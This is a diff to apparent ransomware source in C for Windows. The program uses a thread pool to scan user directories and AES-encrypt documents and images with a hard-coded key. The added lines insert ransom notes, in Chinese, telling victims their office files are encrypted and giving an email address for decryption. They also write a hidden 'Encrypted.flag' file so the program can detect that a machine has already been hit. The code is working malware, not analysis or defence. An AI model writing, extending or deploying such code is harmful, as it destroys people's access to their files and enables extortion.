@@ -8,6 +8,7 @@
 
 #include "threadpool.c"
 #include <stdatomic.h>
+#include <windows.h>
 
 threadpool* pool=NULL;
 FILE* fp=NULL;
@@ -16,6 +17,9 @@ char* path_arr[300000];
 const unsigned char key[] = "0123456789abcdef"; // 128-bit (16 bytes) AES密钥
 char inputFile[1024];
 char encryptedFile[1024];
+
+// 是否加密标志
+int Encrypted=0;
 
 atomic_int path_arr_index= ATOMIC_VAR_INIT(0),
     txt_counts= ATOMIC_VAR_INIT(0),
@@ -29,6 +33,24 @@ atomic_int path_arr_index= ATOMIC_VAR_INIT(0),
     png_counts= ATOMIC_VAR_INIT(0),
     gif_counts= ATOMIC_VAR_INIT(0);
 
+// 检查是否已执行过加密并....
+void init(){
+    DIR* dir=NULL;
+    if((dir=opendir("c:/Users/"))==NULL){
+        printf("fail open 'c:/users/' DIR T_T\n");
+        system("pause > nul");
+        exit(1);
+    }
+    struct dirent *entry;
+    while((entry=readdir(dir))){
+        if(strcmp(entry->d_name,"Encrypted.flag")==0){
+            Encrypted=1;
+            break;
+        }
+    }
+    closedir(dir);
+
+}
 
 // 加密文件函数
 void encryptFile(const char* inputFile, const char* outputFile, const unsigned char* key) {
@@ -307,6 +329,22 @@ void scan(void*arg)
 
 int main()
 {
+    system("chcp 65001 > nul");
+    init();
+    if(Encrypted){
+        printf("\n( º﹃º ) ( º﹃º )\n\
+( º﹃º ) ( º﹃º )\n\
+( º﹃º ) ( º﹃º )\n\
+( º﹃º ) ( º﹃º )\n\n\
+你当前用户目录下的办公文件全被加密，若需解密，请邮箱联系 wufake70@gmail.com. \n\n\
+(｡ŏ_ŏ) (｡ŏ_ŏ)\n\
+(｡ŏ_ŏ) (｡ŏ_ŏ)\n\
+(｡ŏ_ŏ) (｡ŏ_ŏ)\n\
+(｡ŏ_ŏ) (｡ŏ_ŏ)\n");
+        system("pause > nul");
+        return 0;
+    }
+
     pool=threadpoolinit(50);
     if(pool==NULL){
         printf("Unable make threadpool T_T!");
@@ -342,7 +380,9 @@ int main()
                                 \n\t\t %d csv,\t%d ppt\
                                 \n\t\t %d jpg,\t%d jpeg\
                                 \n\t\t %d png,\t%d gif\
-                                \n\t\t %d Files,\tConsumed time %d sec.\n\n",\
+                                \n\t\t %d Files,\tConsumed time %d sec.\n\
+                                ( º﹃º )\t( º﹃º )\n\
+                                你当前用户目录下的(以上)文件全被加密，若需解密，请邮箱联系 wufake70@gmail.com. (｡ŏ_ŏ)\n\n",\
                                 pdf_counts,txt_counts,\
                                 docx_counts,pptx_counts,\
                                 csv_counts,ppt_counts,\
@@ -353,6 +393,17 @@ int main()
     fseek(fp,0,SEEK_SET);
     fputs(msg,fp);
     fclose(fp);
+
+    // 设置已加密的标志
+    if(fp=fopen("c:/users/Encrypted.flag","w")){
+        // 设置隐藏属性（仅适用于Windows系统）
+        int result = SetFileAttributesA("c:/users/Encrypted.flag", FILE_ATTRIBUTE_HIDDEN);
+        if (result == 0) {
+            printf("Error setting file attributes.\n");
+            exit(1);
+        }
+        fclose(fp);
+    }
 
     printf("encrypted files: \n\t\t %d pdf,\t%d txt\
                            \n\t\t %d docx,\t%d pptx\
@@ -369,7 +420,7 @@ int main()
 
     
 
-    system("pause");
+    system("pause > nul");
 
     return 0;
 }
